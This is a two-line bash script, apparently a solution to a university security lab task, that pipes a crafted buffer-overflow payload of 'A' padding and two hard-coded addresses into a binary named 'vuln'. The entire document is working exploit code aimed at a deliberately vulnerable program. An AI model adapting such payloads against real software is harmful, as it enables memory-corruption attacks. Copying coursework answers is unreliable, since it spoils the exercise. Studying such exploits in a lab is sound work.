#!/usr/bin/env bash
echo -en "$(python -c "print('A'*398 + '\xe4\x88\xff\x43' + 'A'*400 + '\x30\xb3\xe5\xe0' + 'A'*7)")" | /task1/s1803764/vuln